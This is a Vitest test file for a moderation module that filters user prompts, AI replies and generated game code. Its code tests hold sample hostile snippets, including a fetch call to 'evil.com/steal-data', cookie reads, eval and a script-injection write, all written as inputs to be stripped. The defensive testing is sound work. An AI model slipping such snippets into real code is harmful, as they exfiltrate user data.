import { describe, it, expect } from "vitest";
import { moderateInput, moderateCode, moderateReply } from "./moderateContent";

describe("moderateInput", () => {
  it("passes clean input through", () => {
    const result = moderateInput("Make a bouncing ball game");
    expect(result.isBlocked).toBe(false);
    expect(result.blockedTerms).toHaveLength(0);
  });

  it("blocks profanity", () => {
    const result = moderateInput("make a damn ball");
    expect(result.isBlocked).toBe(true);
    expect(result.blockedTerms).toContain("damn");
  });

  it("blocks violence-related words", () => {
    const result = moderateInput("make a gun shooting game");
    expect(result.isBlocked).toBe(true);
    expect(result.blockedTerms).toContain("gun");
  });

  it("is case insensitive", () => {
    const result = moderateInput("Make a BOMB explosion");
    expect(result.isBlocked).toBe(true);
    expect(result.blockedTerms).toContain("bomb");
  });

  it("uses word boundaries to avoid false positives", () => {
    // "shell" contains "hell" but should not trigger
    const result = moderateInput("make a seashell collector");
    expect(result.isBlocked).toBe(false);
  });

  it("avoids false positive on 'grass' for 'ass'", () => {
    const result = moderateInput("make green grass grow");
    expect(result.isBlocked).toBe(false);
  });

  it("avoids false positive on 'class' for 'ass'", () => {
    const result = moderateInput("this is a physics class");
    expect(result.isBlocked).toBe(false);
  });

  it("avoids false positive on 'assassin' for 'ass'", () => {
    // "assassin" is one word — \bass\b should NOT match inside it
    const result = moderateInput("assassin");
    expect(result.isBlocked).toBe(false);
  });

  it("blocks multiple terms", () => {
    const result = moderateInput("make a gun that shoots a bomb");
    expect(result.isBlocked).toBe(true);
    expect(result.blockedTerms).toContain("gun");
    expect(result.blockedTerms).toContain("bomb");
  });

  it("passes emoji-heavy input", () => {
    const result = moderateInput("🚀 make a 🌟 star ⭐ catcher 🎮");
    expect(result.isBlocked).toBe(false);
  });

  it("blocks drug references", () => {
    const result = moderateInput("make a marijuana plant");
    expect(result.isBlocked).toBe(true);
  });

  it("passes empty input", () => {
    const result = moderateInput("");
    expect(result.isBlocked).toBe(false);
  });
});

describe("moderateCode", () => {
  it("passes clean game code through", () => {
    const code = `
      game.setBackground("#000");
      const player = game.createEntity("player", 100, 100);
      game.on("tap", (x, y) => player.moveTo(x, y));
    `;
    const result = moderateCode(code);
    expect(result.isBlocked).toBe(false);
  });

  it("strips fetch calls", () => {
    const code = 'fetch("https://evil.com/steal-data")';
    const result = moderateCode(code);
    expect(result.isBlocked).toBe(true);
    expect(result.cleanedText).not.toContain("fetch");
  });

  it("strips eval calls", () => {
    const code = 'eval("alert(1)")';
    const result = moderateCode(code);
    expect(result.isBlocked).toBe(true);
    expect(result.cleanedText).not.toContain("eval");
  });

  it("strips document.cookie access", () => {
    const code = "const c = document.cookie;";
    const result = moderateCode(code);
    expect(result.isBlocked).toBe(true);
    expect(result.cleanedText).not.toContain("document.cookie");
  });

  it("strips external URLs", () => {
    const code = 'const img = "https://example.com/image.png";';
    const result = moderateCode(code);
    expect(result.isBlocked).toBe(true);
    expect(result.cleanedText).not.toContain("https://example.com");
  });

  it("strips new Function constructor", () => {
    const code = 'const fn = new Function("return 1")';
    const result = moderateCode(code);
    expect(result.isBlocked).toBe(true);
  });

  it("strips XMLHttpRequest", () => {
    const code = "const xhr = new XMLHttpRequest();";
    const result = moderateCode(code);
    expect(result.isBlocked).toBe(true);
  });

  it("strips parent/top frame access", () => {
    const code = "parent.postMessage('data', '*');";
    const result = moderateCode(code);
    expect(result.isBlocked).toBe(true);
  });

  it("strips document.write", () => {
    const code = 'document.write("<script>alert(1)</script>")';
    const result = moderateCode(code);
    expect(result.isBlocked).toBe(true);
  });

  it("passes canvas drawing code", () => {
    const code = `
      ctx.fillStyle = "red";
      ctx.fillRect(0, 0, 100, 100);
      ctx.beginPath();
      ctx.arc(50, 50, 25, 0, Math.PI * 2);
    `;
    const result = moderateCode(code);
    expect(result.isBlocked).toBe(false);
  });

  it("replaces blocked patterns with /* removed */", () => {
    const code = 'eval("hello")';
    const result = moderateCode(code);
    expect(result.cleanedText).toContain("/* removed */");
  });
});

describe("moderateReply", () => {
  it("passes clean AI replies", () => {
    const result = moderateReply(
      "Great idea! Let's make a bouncing ball with gravity!",
    );
    expect(result.isBlocked).toBe(false);
  });

  it("blocks inappropriate AI replies", () => {
    const result = moderateReply("Let's make a weapon simulator");
    expect(result.isBlocked).toBe(true);
  });
});
